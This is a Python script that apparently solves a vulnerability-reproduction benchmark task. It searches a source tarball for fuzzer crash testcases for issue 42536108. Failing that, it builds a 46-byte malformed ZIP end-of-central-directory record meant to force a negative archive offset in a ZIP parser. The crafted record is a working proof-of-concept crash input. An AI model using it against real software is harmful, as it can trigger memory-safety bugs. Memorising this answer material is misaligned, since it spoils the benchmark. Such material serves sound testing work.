import os
import re
import io
import tarfile
import struct
import gzip
import bz2
import lzma
from typing import Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        issue_id = "42536108"

        best: Optional[Tuple[Tuple[int, int, str], bytes]] = None

        def is_probably_source(name: str) -> bool:
            n = name.lower()
            if any(n.endswith(ext) for ext in (
                ".c", ".cc", ".cpp", ".cxx",
                ".h", ".hh", ".hpp", ".hxx",
                ".m", ".mm",
                ".rs", ".go", ".java", ".kt", ".swift",
                ".py", ".js", ".ts",
                ".cs",
                ".rb", ".php",
                ".sh", ".bat", ".ps1",
                ".md", ".rst", ".txt",
                ".json", ".yaml", ".yml", ".toml", ".ini", ".cfg",
                ".cmake", ".mk", ".make",
                ".in", ".am", ".ac", ".m4",
                ".gradle", ".gyp", ".gypi",
                ".xml", ".html", ".css",
                ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
                ".pdf",
            )):
                return True
            base = os.path.basename(n)
            if base in ("readme", "license", "copying", "authors", "changelog"):
                return True
            return False

        def priority(name: str) -> int:
            n = name.lower()
            base = os.path.basename(n)
            if issue_id in n:
                return 0
            if ("clusterfuzz-testcase" in n) or ("minimized" in n) or ("crash" in base) or ("poc" in base) or ("repro" in base):
                return 1
            if ("testcase" in n) or ("/corpus/" in n) or ("/fuzz" in n) or ("artifact" in n) or ("regression" in n):
                return 2
            return 3

        def maybe_decompress(name: str, data: bytes) -> bytes:
            n = name.lower()
            if len(data) >= 2 and data[:2] == b"\x1f\x8b":
                try:
                    return gzip.decompress(data)
                except Exception:
                    return data
            if len(data) >= 3 and data[:3] == b"BZh":
                try:
                    return bz2.decompress(data)
                except Exception:
                    return data
            if len(data) >= 6 and data[:6] == b"\xfd7zXZ\x00":
                try:
                    return lzma.decompress(data)
                except Exception:
                    return data
            if n.endswith(".gz"):
                try:
                    return gzip.decompress(data)
                except Exception:
                    return data
            if n.endswith(".bz2"):
                try:
                    return bz2.decompress(data)
                except Exception:
                    return data
            if n.endswith(".xz") or n.endswith(".lzma"):
                try:
                    return lzma.decompress(data)
                except Exception:
                    return data
            return data

        def consider(name: str, data: bytes) -> None:
            nonlocal best
            pr = priority(name)
            key = (pr, len(data), name)
            if best is None or key < best[0]:
                best = (key, data)

        # Scan tarball for embedded reproducers / artifacts
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                for m in members:
                    if not m.isreg():
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    name = m.name
                    if is_probably_source(name):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if not data:
                        continue
                    data2 = maybe_decompress(name, data)
                    if data2 and len(data2) <= 2_000_000:
                        data = data2
                    consider(name, data)
                    if issue_id in name and len(data) == 46:
                        return data
                    if ("clusterfuzz-testcase" in name.lower() or "minimized" in name.lower()) and len(data) == 46:
                        return data
        except Exception:
            best = None

        if best is not None:
            return best[1]

        # Fallback PoC (ZIP EOCD with central directory size causing negative archive start offset)
        # Total length: 46 bytes = 24 bytes prefix + 22 bytes EOCD (comment length 0)
        prefix = b"\x00" * 24
        eocd = struct.pack(
            "<4sHHHHIIH",
            b"PK\x05\x06",
            0, 0, 0, 0,
            25,        # central directory size (eocd_pos + 1) => negative start offset
            0,         # central directory offset
            0          # comment length
        )
        return prefix + eocd